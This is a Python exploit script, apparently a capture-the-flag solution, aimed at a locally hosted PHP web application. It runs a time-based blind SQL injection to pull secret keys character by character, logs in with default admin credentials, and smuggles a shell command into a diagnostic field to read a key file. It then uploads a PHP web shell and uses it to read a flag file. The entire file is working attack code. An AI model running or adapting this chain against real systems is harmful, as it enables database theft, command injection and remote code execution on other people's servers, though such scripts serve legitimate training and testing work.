import io
import string
import sys
import time
from urllib.parse import urljoin

import requests


BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8088/"
SLEEP = 0.65
THRESHOLD = 0.45
ALPHABET = string.ascii_letters + string.digits + "-_{}"


def oracle(condition: str) -> bool:
    payload = f"x' OR IF(({condition}),SLEEP({SLEEP}),0)-- -"
    started = time.perf_counter()
    response = requests.get(
        urljoin(BASE, "search.php"),
        params={"q": payload},
        headers={"Cache-Control": "no-cache"},
        timeout=10,
    )
    response.raise_for_status()
    elapsed = time.perf_counter() - started
    return elapsed > THRESHOLD


def extract(name: str, limit: int = 64) -> str:
    value = ""
    for position in range(1, limit + 1):
        found = None
        for char in ALPHABET:
            condition = (
                "ASCII(SUBSTRING((SELECT value FROM secrets "
                f"WHERE name='{name}'),{position},1))={ord(char)}"
            )
            if oracle(condition):
                found = char
                value += char
                print(f"{name}[{position}] = {char}")
                break
        if found is None:
            return value
    return value


session = requests.Session()
print("[*] extracting diagnostic key")
diag_key = extract("diag_key")
print("[*] extracting upload key")
upload_key = extract("upload_key")

login = session.post(
    urljoin(BASE, "login.php"),
    data={"username": "admin", "password": "admin"},
)
login.raise_for_status()

diagnostic = session.post(
    urljoin(BASE, "diagnose.php"),
    data={"diag_key": diag_key, "host": "127.0.0.1; cat /run/app/upload.key"},
)
diagnostic.raise_for_status()
assert upload_key in diagnostic.text, "diagnostic command did not reveal upload key"

webshell = b"<?php system($_GET['c'] ?? 'id'); ?>"
upload = session.post(
    urljoin(BASE, "upload.php"),
    data={"key": upload_key},
    files={"file": ("shell.phtml", io.BytesIO(webshell), "application/octet-stream")},
)
upload.raise_for_status()

shell_url = urljoin(BASE, "uploads/shell.phtml")
flag = session.get(shell_url, params={"c": "cat /var/www/html/uploads/.vault_flag"})
flag.raise_for_status()
print("[+] flag:", flag.text.strip())
